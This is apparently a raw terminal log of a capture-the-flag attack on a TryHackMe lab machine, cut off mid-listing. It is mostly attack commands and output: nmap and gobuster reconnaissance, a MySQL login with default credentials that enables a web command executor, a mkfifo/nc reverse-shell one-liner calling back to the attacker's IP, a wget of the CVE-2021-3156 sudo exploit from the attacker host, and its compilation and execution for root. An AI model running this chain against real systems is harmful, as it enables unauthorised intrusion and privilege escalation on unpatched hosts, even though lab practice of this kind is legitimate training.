@@ -1,0 +1,984 @@
+
+f
+┌─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $nmap -sVC lunizz.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-28 08:58 IST
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+Nmap scan report for lunizz.thm (10.10.154.70)
+Host is up (0.56s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
+|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
+|_  256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3306/tcp open  mysql      MySQL 5.7.32-0ubuntu0.18.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.32-0ubuntu0.18.04.1
+|   Thread ID: 5
+|   Capabilities flags: 65535
+|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, FoundRows, ODBCClient, Speaks41ProtocolNew, LongColumnFlag, DontAllowDatabaseTableColumn, LongPassword, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x01u\x07"V6.\x1A\x1A	3hL!0tjG\x13\x04
+|_  Auth Plugin Name: mysql_native_password
+4444/tcp open  tcpwrapped
+5000/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+┌─[✗]─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $gobuster dir -u http://lunizz.thm/ --wordlist '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -x txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://lunizz.thm/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt
+[+] Timeout:        10s
+===============================================================
+2021/02/28 09:10:15 Starting gobuster
+===============================================================
+/instructions.txt (Status: 200)
+
+Progress: 7177 / 220561 (3.25%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2021/02/28 09:21:50 Finished
+===============================================================
+┌─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $gobuster dir -u http://lunizz.thm/ --wordlist '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://lunizz.thm/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/02/28 09:21:54 Starting gobuster
+===============================================================
+/hidden (Status: 301)
+/whatever (Status: 301)
+Progress: 43394 / 220561 (19.67%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2021/02/28 09:49:44 Finished
+===============================================================
+┌─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $
+
+
+
+http://lunizz.thm/instructions.txt
+
+Made By CTF_SCRIPTS_CAVE (not real)
+
+Thanks for installing our ctf script
+
+#Steps
+- Create a mysql user (runcheck:CTF_script_cave_changeme)
+- Change necessary lines of config.php file
+
+Done you can start using ctf script
+
+#Notes
+please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
+
+
+http://lunizz.thm/whatever/index.php
+
+command executor :)
+
+
+┌─[✗]─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $mysql --help
+mysql  Ver 15.1 Distrib 10.3.23-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Usage: mysql [OPTIONS] [database]
+
+Default options are read from the following files in the given order:
+/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf 
+The following groups are read: mysql client client-server client-mariadb
+The following options may be given as the first argument:
+--print-defaults          Print the program argument list and exit.
+--no-defaults             Don't read default options from any option file.
+The following specify which files/extra groups are read (specified before remaining options):
+--defaults-file=#         Only read default options from the given file #.
+--defaults-extra-file=#   Read this file after the global files are read.
+--defaults-group-suffix=# Additionally read default groups with # appended as a suffix.
+
+  -?, --help          Display this help and exit.
+  -I, --help          Synonym for -?
+  --abort-source-on-error 
+                      Abort 'source filename' operations in case of errors
+  --auto-rehash       Enable automatic rehashing. One doesn't need to use
+                      'rehash' to get table and field completion, but startup
+                      and reconnecting may take a longer time. Disable with
+                      --disable-auto-rehash.
+                      (Defaults to on; use --skip-auto-rehash to disable.)
+  -A, --no-auto-rehash 
+                      No automatic rehashing. One has to use 'rehash' to get
+                      table and field completion. This gives a quicker start of
+                      mysql and disables rehashing on reconnect.
+  --auto-vertical-output 
+                      Automatically switch to vertical output mode if the
+                      result is wider than the terminal width.
+  -B, --batch         Don't use history file. Disable interactive behavior.
+                      (Enables --silent.)
+  --binary-as-hex     Print binary data as hex
+  --character-sets-dir=name 
+                      Directory for character set files.
+  --column-type-info  Display column type information.
+  -c, --comments      Preserve comments. Send comments to the server. The
+                      default is --skip-comments (discard comments), enable
+                      with --comments.
+  -C, --compress      Use compression in server/client protocol.
+  -#, --debug[=#]     This is a non-debug version. Catch this and exit.
+  --debug-check       Check memory and open file usage at exit.
+  -T, --debug-info    Print some debug info at exit.
+  -D, --database=name Database to use.
+  --default-character-set=name 
+                      Set the default character set.
+  --delimiter=name    Delimiter to be used.
+  -e, --execute=name  Execute command and quit. (Disables --force and history
+                      file.)
+  -E, --vertical      Print the output of a query (rows) vertically.
+  -f, --force         Continue even if we get an SQL error. Sets
+                      abort-source-on-error to 0
+  -G, --named-commands 
+                      Enable named commands. Named commands mean this program's
+                      internal commands; see mysql> help . When enabled, the
+                      named commands can be used from any line of the query,
+                      otherwise only from the first line, before an enter.
+                      Disable with --disable-named-commands. This option is
+                      disabled by default.
+  -i, --ignore-spaces Ignore space after function names.
+  --init-command=name SQL Command to execute when connecting to MySQL server.
+                      Will automatically be re-executed when reconnecting.
+  --local-infile      Enable/disable LOAD DATA LOCAL INFILE.
+  -b, --no-beep       Turn off beep on error.
+  -h, --host=name     Connect to host.
+  -H, --html          Produce HTML output.
+  -X, --xml           Produce XML output.
+  --line-numbers      Write line numbers for errors.
+                      (Defaults to on; use --skip-line-numbers to disable.)
+  -L, --skip-line-numbers 
+                      Don't write line number for errors.
+  -n, --unbuffered    Flush buffer after each query.
+  --column-names      Write column names in results.
+                      (Defaults to on; use --skip-column-names to disable.)
+  -N, --skip-column-names 
+                      Don't write column names in results.
+  --sigint-ignore     Ignore SIGINT (CTRL-C).
+  -o, --one-database  Ignore statements except those that occur while the
+                      default database is the one named at the command line.
+  --pager[=name]      Pager to use to display results. If you don't supply an
+                      option, the default pager is taken from your ENV variable
+                      PAGER. Valid pagers are less, more, cat [> filename],
+                      etc. See interactive help (\h) also. This option does not
+                      work in batch mode. Disable with --disable-pager. This
+                      option is disabled by default.
+  -p, --password[=name] 
+                      Password to use when connecting to server. If password is
+                      not given it's asked from the tty.
+  -P, --port=#        Port number to use for connection or 0 for default to, in
+                      order of preference, my.cnf, $MYSQL_TCP_PORT,
+                      /etc/services, built-in default (3306).
+  --progress-reports  Get progress reports for long running commands (like
+                      ALTER TABLE)
+                      (Defaults to on; use --skip-progress-reports to disable.)
+  --prompt=name       Set the mysql prompt to this value.
+  --protocol=name     The protocol to use for connection (tcp, socket, pipe,
+                      memory).
+  -q, --quick         Don't cache result, print it row by row. This may slow
+                      down the server if the output is suspended. Doesn't use
+                      history file.
+  -r, --raw           Write fields without conversion. Used with --batch.
+  --reconnect         Reconnect if the connection is lost. Disable with
+                      --disable-reconnect. This option is enabled by default.
+                      (Defaults to on; use --skip-reconnect to disable.)
+  -s, --silent        Be more silent. Print results with a tab as separator,
+                      each row on new line.
+  -S, --socket=name   The socket file to use for connection.
+  --ssl               Enable SSL for connection (automatically enabled with
+                      other flags).
+  --ssl-ca=name       CA file in PEM format (check OpenSSL docs, implies
+                      --ssl).
+  --ssl-capath=name   CA directory (check OpenSSL docs, implies --ssl).
+  --ssl-cert=name     X509 cert in PEM format (implies --ssl).
+  --ssl-cipher=name   SSL cipher to use (implies --ssl).
+  --ssl-key=name      X509 key in PEM format (implies --ssl).
+  --ssl-crl=name      Certificate revocation list (implies --ssl).
+  --ssl-crlpath=name  Certificate revocation list path (implies --ssl).
+  --ssl-verify-server-cert 
+                      Verify server's "Common Name" in its cert against
+                      hostname used when connecting. This option is disabled by
+                      default.
+  -t, --table         Output in table format.
+  --tee=name          Append everything into outfile. See interactive help (\h)
+                      also. Does not work in batch mode. Disable with
+                      --disable-tee. This option is disabled by default.
+  -u, --user=name     User for login if not current user.
+  -U, --safe-updates  Only allow UPDATE and DELETE that uses keys.
+  -U, --i-am-a-dummy  Synonym for option --safe-updates, -U.
+  -v, --verbose       Write more. (-v -v -v gives the table output format).
+  -V, --version       Output version information and exit.
+  -w, --wait          Wait and retry if connection is down.
+  --connect-timeout=# Number of seconds before connection timeout.
+  --max-allowed-packet=# 
+                      The maximum packet length to send to or receive from
+                      server.
+  --net-buffer-length=# 
+                      The buffer size for TCP/IP and socket communication.
+  --select-limit=#    Automatic limit for SELECT when using --safe-updates.
+  --max-join-size=#   Automatic limit for rows in a join when using
+                      --safe-updates.
+  --secure-auth       Refuse client connecting to server if it uses old
+                      (pre-4.1.1) protocol.
+  --server-arg=name   Send embedded server this as a parameter.
+  --show-warnings     Show warnings after every statement.
+  --plugin-dir=name   Directory for client-side plugins.
+  --default-auth=name Default authentication client-side plugin to use.
+  --binary-mode       By default, ASCII '\0' is disallowed and '\r\n' is
+                      translated to '\n'. This switch turns off both features,
+                      and also turns off parsing of all clientcommands except
+                      \C and DELIMITER, in non-interactive mode (for input
+                      piped to mysql or loaded using the 'source' command).
+                      This is necessary when processing output from mysqlbinlog
+                      that may contain blobs.
+
+Variables (--variable-name=value)
+and boolean options {FALSE|TRUE}  Value (after reading options)
+--------------------------------- ----------------------------------------
+abort-source-on-error             FALSE
+auto-rehash                       TRUE
+auto-vertical-output              FALSE
+binary-as-hex                     FALSE
+character-sets-dir                (No default value)
+column-type-info                  FALSE
+comments                          FALSE
+compress                          FALSE
+debug-check                       FALSE
+debug-info                        FALSE
+database                          (No default value)
+default-character-set             utf8mb4
+delimiter                         ;
+vertical                          FALSE
+force                             FALSE
+named-commands                    FALSE
+ignore-spaces                     FALSE
+init-command                      (No default value)
+local-infile                      FALSE
+no-beep                           FALSE
+host                              (No default value)
+html                              FALSE
+xml                               FALSE
+line-numbers                      TRUE
+unbuffered                        FALSE
+column-names                      TRUE
+sigint-ignore                     FALSE
+port                              0
+progress-reports                  TRUE
+prompt                            \N [\d]> 
+quick                             FALSE
+raw                               FALSE
+reconnect                         TRUE
+socket                            /var/run/mysqld/mysqld.sock
+ssl                               FALSE
+ssl-ca                            (No default value)
+ssl-capath                        (No default value)
+ssl-cert                          (No default value)
+ssl-cipher                        (No default value)
+ssl-key                           (No default value)
+ssl-crl                           (No default value)
+ssl-crlpath                       (No default value)
+ssl-verify-server-cert            FALSE
+table                             FALSE
+user                              (No default value)
+safe-updates                      FALSE
+i-am-a-dummy                      FALSE
+connect-timeout                   0
+max-allowed-packet                16777216
+net-buffer-length                 16384
+select-limit                      1000
+max-join-size                     1000000
+secure-auth                       FALSE
+show-warnings                     FALSE
+plugin-dir                        (No default value)
+default-auth                      (No default value)
+binary-mode                       FALSE
+
+
+
+
+try sql credentials
+
+
+└──╼ $sudo mysql -h lunizz.thm -u 'runcheck' -P 3306 -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 14
+Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| runornot           |
++--------------------+
+2 rows in set (0.316 sec)
+
+MySQL [(none)]> use runornot;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+i know already runcheck lets find whats in there
+Database changed
+MySQL [runornot]> select * from runcheck;
++------+
+| run  |
++------+
+|    0 |
++------+
+1 row in set (0.470 sec)
+
+MySQL [runornot]> update runcheck set run=1 where run=0;
+Query OK, 1 row affected (0.250 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MySQL [runornot]> select * from runcheck;
++------+
+| run  |
++------+
+|    1 |
++------+
+1 row in set (0.352 sec)
+
+MySQL [runornot]> exit
+Bye
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.*.*.* 9999 >/tmp/f
+
+
+┌─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $nc -nlvp 9999
+listening on [any] 9999 ...
+connect to [10.*.*.*] from (UNKNOWN) [10.10.154.70] 42220
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@lunizz:/var/www/html/whatever$ export TERM=xterm-256-color
+export TERM=xterm-256-color
+www-data@lunizz:/var/www/html/whatever$ ^Z
+[1]+  Stopped                 nc -nlvp 9999
+┌─[✗]─[kevin@parrot]─[~/THM/lunizzctf]
+└──╼ $stty raw -echo;fg
+nc -nlvp 9999
+
+www-data@lunizz:/var/www/html/whatever$ 
+www-data@lunizz:/var/www/html/whatever$ ls -la
+total 16
+drwxr-xr-x 2 root root 4096 Dec  7 17:32 .
+drwxr-xr-x 4 root root 4096 Dec 10 19:44 ..
+-rw-r--r-- 1 root root  269 Dec  7 17:01 config.php
+-rw-r--r-- 1 root root  584 Dec  7 17:31 index.php
+www-data@lunizz:/var/www/html/whatever$ cd
+bash: cd: HOME not set
+www-data@lunizz:/var/www/html/whatever$ cd /home
+www-data@lunizz:/home$ ls -la
+total 16
+drwxr-xr-x  4 root  root  4096 Dec 10 19:18 .
+drwxr-xr-x 25 root  root  4096 Dec 14 04:53 ..
+drwxr-x---  5 adam  adam  4096 Dec 10 20:15 adam
+drwxr-x---  4 mason mason 4096 Dec 14 04:52 mason
+www-data@lunizz:/home$ cd adam
+bash: cd: adam: Permission denied
+www-data@lunizz:/home$ cd mason
+bash: cd: mason: Permission denied
+www-data@lunizz:/home$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+www-data@lunizz:/home$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 18.04.5 LTS
+Release:	18.04
+Codename:	bionic
+
+
+ah yeah low version  we can try CVE-2021-3156 .. dont know abt CVE try linux suggester
+www-data@lunizz:/home$ ls
+adam  mason
+www-data@lunizz:/home$ cd /tmp
+
+www-data@lunizz:/tmp$ wget http://10.*.*.*:8000/obz.tar.gz
+--2021-02-28 03:58:38--  http://10.*.*.*:8000/obz.tar.gz
+Connecting to 10.8.1.147:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 39421 (38K) [application/gzip]
+Saving to: 'obz.tar.gz'
+
+obz.tar.gz          100%[===================>]  38.50K  9.40KB/s    in 4.1s    
+
+2021-02-28 03:58:43 (9.40 KB/s) - 'obz.tar.gz' saved [39421/39421]
+
+www-data@lunizz:/tmp$ ls
+f  obz.tar.gz  sudo-hax-me-a-sandwich
+www-data@lunizz:/tmp$ tar -xvzf obz.tar.gz
+CVE-2021-3156/
+CVE-2021-3156/hax.c
+CVE-2021-3156/obz.tar.gz
+CVE-2021-3156/.git/
+CVE-2021-3156/.git/hooks/
+CVE-2021-3156/.git/hooks/post-update.sample
+CVE-2021-3156/.git/hooks/commit-msg.sample
+CVE-2021-3156/.git/hooks/pre-commit.sample
+CVE-2021-3156/.git/hooks/pre-applypatch.sample
+CVE-2021-3156/.git/hooks/update.sample
+CVE-2021-3156/.git/hooks/fsmonitor-watchman.sample
+CVE-2021-3156/.git/hooks/pre-push.sample
+CVE-2021-3156/.git/hooks/prepare-commit-msg.sample
+CVE-2021-3156/.git/hooks/pre-receive.sample
+CVE-2021-3156/.git/hooks/applypatch-msg.sample
+CVE-2021-3156/.git/hooks/pre-merge-commit.sample
+CVE-2021-3156/.git/hooks/pre-rebase.sample
+CVE-2021-3156/.git/packed-refs
+CVE-2021-3156/.git/logs/
+CVE-2021-3156/.git/logs/HEAD
+CVE-2021-3156/.git/logs/refs/
+CVE-2021-3156/.git/logs/refs/heads/
+CVE-2021-3156/.git/logs/refs/heads/main
+CVE-2021-3156/.git/logs/refs/remotes/
+CVE-2021-3156/.git/logs/refs/remotes/origin/
+CVE-2021-3156/.git/logs/refs/remotes/origin/HEAD
+CVE-2021-3156/.git/info/
+CVE-2021-3156/.git/info/exclude
+CVE-2021-3156/.git/HEAD
+CVE-2021-3156/.git/description
+CVE-2021-3156/.git/refs/
+CVE-2021-3156/.git/refs/heads/
+CVE-2021-3156/.git/refs/heads/main
+CVE-2021-3156/.git/refs/tags/
+CVE-2021-3156/.git/refs/remotes/
+CVE-2021-3156/.git/refs/remotes/origin/
+CVE-2021-3156/.git/refs/remotes/origin/HEAD
+CVE-2021-3156/.git/objects/
+CVE-2021-3156/.git/objects/9b/
+CVE-2021-3156/.git/objects/9b/a721209e1e495a0c6994f07cf511835b617a9d
+CVE-2021-3156/.git/objects/de/
+CVE-2021-3156/.git/objects/de/f0f99b764fcf2204c80b20884e1563c0e7e545
+CVE-2021-3156/.git/objects/39/
+CVE-2021-3156/.git/objects/39/92e4eb7f7e114c66917ca13b66994193f72b47
+CVE-2021-3156/.git/objects/af/
+CVE-2021-3156/.git/objects/af/492f0a3d40117014ac9c169061f499657f0adb
+CVE-2021-3156/.git/objects/1c/
+CVE-2021-3156/.git/objects/1c/9feb288f87412661e5e5905b7c7558bc40a05d
+CVE-2021-3156/.git/objects/d6/
+CVE-2021-3156/.git/objects/d6/193b6f9f9b71a4e96c291dadfb46aae222f412
+CVE-2021-3156/.git/objects/da/
+CVE-2021-3156/.git/objects/da/68f7c1a2961595a3226b903f1fc180b8824255
+CVE-2021-3156/.git/objects/26/
+CVE-2021-3156/.git/objects/26/4f1210e427e73b93a8219e8cfa25f0717913ec
+CVE-2021-3156/.git/objects/c4/
+CVE-2021-3156/.git/objects/c4/531fb550a01ad90e81558f3211fa88d62e913a
+CVE-2021-3156/.git/objects/dd/
+CVE-2021-3156/.git/objects/dd/badb1d3f2b47eeb2f6768146e7df4bddb95fe1
+CVE-2021-3156/.git/objects/dd/33fa20a2ad04cb10c3de3910d392284a114e8c
+CVE-2021-3156/.git/objects/7b/
+CVE-2021-3156/.git/objects/7b/fff08c9577cfd750c7ec8718eecd46d460d123
+CVE-2021-3156/.git/objects/0c/
+CVE-2021-3156/.git/objects/0c/e00b8d07e6a9b32cbbe3b035f17624a415c47e
+CVE-2021-3156/.git/objects/8c/
+CVE-2021-3156/.git/objects/8c/2d8eae2eb99bb4d63edc7d0aa495cb620af0c0
+CVE-2021-3156/.git/objects/94/
+CVE-2021-3156/.git/objects/94/454ec28bf97acc1d2f005cafb8c16dd8cacb9b
+CVE-2021-3156/.git/objects/7a/
+CVE-2021-3156/.git/objects/7a/e209a462fae1a32c8b9e244c3f61506c4f5e0b
+CVE-2021-3156/.git/objects/e3/
+CVE-2021-3156/.git/objects/e3/8fdf30312131661931eda5ec8f17db0595c353
+CVE-2021-3156/.git/objects/pack/
+CVE-2021-3156/.git/objects/02/
+CVE-2021-3156/.git/objects/02/b96545a3602c092779140e0fc52e167b5ce986
+CVE-2021-3156/.git/objects/info/
+CVE-2021-3156/.git/objects/ae/
+CVE-2021-3156/.git/objects/ae/eaf45aa45128e02bd572dd7b037a63f1356d7d
+CVE-2021-3156/.git/objects/bb/
+CVE-2021-3156/.git/objects/bb/737ba0b8d92b3ca4c81af4c78569038da63f6a
+CVE-2021-3156/.git/objects/c7/
+CVE-2021-3156/.git/objects/c7/db3019c973d0b442883d5493ad74187f643622
+CVE-2021-3156/.git/objects/ef/
+CVE-2021-3156/.git/objects/ef/f3f5a8f1c489fa87331739c06a8edf46a6ec1b
+CVE-2021-3156/.git/objects/11/
+CVE-2021-3156/.git/objects/11/2a93eaed5319cd8244908e76f398c188442741
+CVE-2021-3156/.git/objects/68/
+CVE-2021-3156/.git/objects/68/ccbdd8026302c324f3ae8cbc98dc5de4f9ced5
+CVE-2021-3156/.git/objects/8d/
+CVE-2021-3156/.git/objects/8d/a7a7ba2944380b0845a81bcb9c4193529138df
+CVE-2021-3156/.git/objects/89/
+CVE-2021-3156/.git/objects/89/a27c41a7164afd20715bcdd34483e3693605e8
+CVE-2021-3156/.git/objects/03/
+CVE-2021-3156/.git/objects/03/c4841a1f00033c031d175ae85556b68d87ef54
+CVE-2021-3156/.git/objects/d2/
+CVE-2021-3156/.git/objects/d2/37a83fd4bd55589a9b86e4eeb56b9d1752974c
+CVE-2021-3156/.git/objects/d8/
+CVE-2021-3156/.git/objects/d8/a29dbc949326369c4b224a745e32605619d937
+CVE-2021-3156/.git/objects/96/
+CVE-2021-3156/.git/objects/96/a383a0c64fd4fffe07117ad78e81bda255d6fe
+CVE-2021-3156/.git/objects/2c/
+CVE-2021-3156/.git/objects/2c/053244a9acb1651b12b484750d7fe96b6b1fbd
+CVE-2021-3156/.git/objects/5d/
+CVE-2021-3156/.git/objects/5d/e3c0ca59201574dd405705861f5ce6ad1644e4
+CVE-2021-3156/.git/objects/37/
+CVE-2021-3156/.git/objects/37/5e6764fa72ac911333e42acee9fa8af35dd7d4
+CVE-2021-3156/.git/objects/c8/
+CVE-2021-3156/.git/objects/c8/1011f333b6a98429c4f59806d82c43e384116a
+CVE-2021-3156/.git/objects/9c/
+CVE-2021-3156/.git/objects/9c/aa3d8dcf44d29f9f1cb37a59d16671a2d05daa
+CVE-2021-3156/.git/objects/e9/
+CVE-2021-3156/.git/objects/e9/99b3b3ec65a2d6bbb7400c4a03993f4cbd9f55
+CVE-2021-3156/.git/objects/85/
+CVE-2021-3156/.git/objects/85/af13c718de828dcde95013195f079e8e2e71b6
+CVE-2021-3156/.git/objects/51/
+CVE-2021-3156/.git/objects/51/ae80374a583104cf98c53f1464116e368a735e
+CVE-2021-3156/.git/objects/1f/
+CVE-2021-3156/.git/objects/1f/74c4718ceb144deec65f11a05077250eebc8ea
+CVE-2021-3156/.git/objects/24/
+CVE-2021-3156/.git/objects/24/494cb60d19dd1f83688fbba0100375b063c922
+CVE-2021-3156/.git/objects/29/
+CVE-2021-3156/.git/objects/29/dbae1374ab931d6e912b10d1580f5179225aa6
+CVE-2021-3156/.git/objects/6b/
+CVE-2021-3156/.git/objects/6b/494e00559a264c198ad4442d4cc4cebd447f5f
+CVE-2021-3156/.git/objects/e2/
+CVE-2021-3156/.git/objects/e2/084ade590ad9a37ad1089b6dcf66da32964e19
+CVE-2021-3156/.git/objects/2f/
+CVE-2021-3156/.git/objects/2f/881244c939bf72d0c3bcac9c8162538cddc19c
+CVE-2021-3156/.git/objects/4c/
+CVE-2021-3156/.git/objects/4c/c4e2400d1be40a9d6bfe5da8708f3b4fb5cd16
+CVE-2021-3156/.git/objects/14/
+CVE-2021-3156/.git/objects/14/c522087aac612420f7cadc49bad95a42a19751
+CVE-2021-3156/.git/objects/fd/
+CVE-2021-3156/.git/objects/fd/033cd6ac02e6d43431a3ab30fb3383225585f9
+CVE-2021-3156/.git/objects/06/
+CVE-2021-3156/.git/objects/06/c694826fd6338f155d0cf389c6683a81b7f493
+CVE-2021-3156/.git/objects/4a/
+CVE-2021-3156/.git/objects/4a/e365c4d251e5b45dacd29b3b03e52364f557c3
+CVE-2021-3156/.git/objects/ac/
+CVE-2021-3156/.git/objects/ac/70a3a2319fa28c8939b0165e475e394c41a59d
+CVE-2021-3156/.git/config
+CVE-2021-3156/.git/branches/
+CVE-2021-3156/.git/index
+CVE-2021-3156/Makefile
+CVE-2021-3156/README.md
+CVE-2021-3156/lib.c
+CVE-2021-3156/brute.sh
+www-data@lunizz:/tmp$ make
+make: *** No targets specified and no makefile found.  Stop.
+www-data@lunizz:/tmp$ ls
+CVE-2021-3156  f  obz.tar.gz  sudo-hax-me-a-sandwich
+www-data@lunizz:/tmp$ cd CVE-2021-3156
+www-data@lunizz:/tmp/CVE-2021-3156$ ls
+Makefile  README.md  brute.sh  hax.c  lib.c  obz.tar.gz
+www-data@lunizz:/tmp/CVE-2021-3156$ 
+www-data@lunizz:/tmp/CVE-2021-3156$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+www-data@lunizz:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+  manual mode:
+    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+    
+    now select our version:>
+
+www-data@lunizz:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[+] bl1ng bl1ng! We got it!
+# ls -la
+total 60
+drwxr-xr-x 4 www-data www-data  4096 Feb 28 03:59 .
+drwxrwxrwt 3 root     root      4096 Feb 28 03:59 ..
+drwxr-xr-x 8 www-data www-data  4096 Feb 28 03:56 .git
+-rw-r--r-- 1 www-data www-data   264 Feb 28 03:56 Makefile
+-rw-r--r-- 1 www-data www-data  1187 Feb 28 03:56 README.md
+-rwxr-xr-x 1 www-data www-data  1994 Feb 28 03:56 brute.sh
+-rw-r--r-- 1 www-data www-data  4420 Feb 28 03:56 hax.c
+-rw-r--r-- 1 www-data www-data   407 Feb 28 03:56 lib.c
+drwxr-xr-x 2 www-data www-data  4096 Feb 28 03:59 libnss_X
+-rw-r--r-- 1 www-data www-data    45 Feb 28 03:57 obz.tar.gz
+-rwxr-xr-x 1 www-data www-data 13040 Feb 28 03:59 sudo-hax-me-a-sandwich
+# cd /home
+# ls
+adam  mason
+# cd adam
+# ls
+Desktop  Documents  Downloads  runasmason  runasmason.dat
+# ls -la
+total 5876
+drwxr-x--- 5 adam  adam     4096 Dec 10 20:15 .
+drwxr-xr-x 4 root  root     4096 Dec 10 19:18 ..
+lrwxrwxrwx 1 root  root        9 Dec 10 19:30 .bash_history -> /dev/null
+-rw-r--r-- 1 adam  adam      220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 adam  adam     3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 adam  adam      807 Apr  4  2018 .profile
+-rw-r--r-- 1 mason mason     166 Dec  7 18:30 .runasmason.conf
+---------- 1 root  root      862 Dec  7 18:42 .runasmason_source_code.bak
+drwxr-xr-x 3 adam  adam     4096 Dec 10 19:31 Desktop
+drwxr-xr-x 2 adam  adam     4096 Dec 10 19:31 Documents
+drwxr-xr-x 2 adam  adam     4096 Dec 10 20:16 Downloads
+-rwxr-xr-x 1 mason mason 5692824 Dec 10 20:14 runasmason
+-rw-r--r-- 1 mason mason  280000 Dec  7 18:55 runasmason.dat
+# cd Desktop
+# ls -la
+total 12
+drwxr-xr-x 3 adam adam 4096 Dec 10 19:31 .
+drwxr-x--- 5 adam adam 4096 Dec 10 20:15 ..
+drwxr-xr-x 2 adam adam 4096 Dec 10 19:38 .archive
+# cd Downloads
+# ls -la
+total 12
+drwxr-xr-x 2 adam adam 4096 Dec 10 20:16 .
+drwxr-x--- 5 adam adam 4096 Dec 10 20:15 ..
+-rw-r--r-- 1 adam adam    6 Dec 10 20:16 empty_file
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@lunizz:/home/adam/Downloads# cd ../
+root@lunizz:/home/adam# ls -la
+total 5876
+drwxr-x--- 5 adam  adam     4096 Dec 10 20:15 .
+drwxr-xr-x 4 root  root     4096 Dec 10 19:18 ..
+lrwxrwxrwx 1 root  root        9 Dec 10 19:30 .bash_history -> /dev/null
+-rw-r--r-- 1 adam  adam      220 Apr  4  2018 .bash_logout
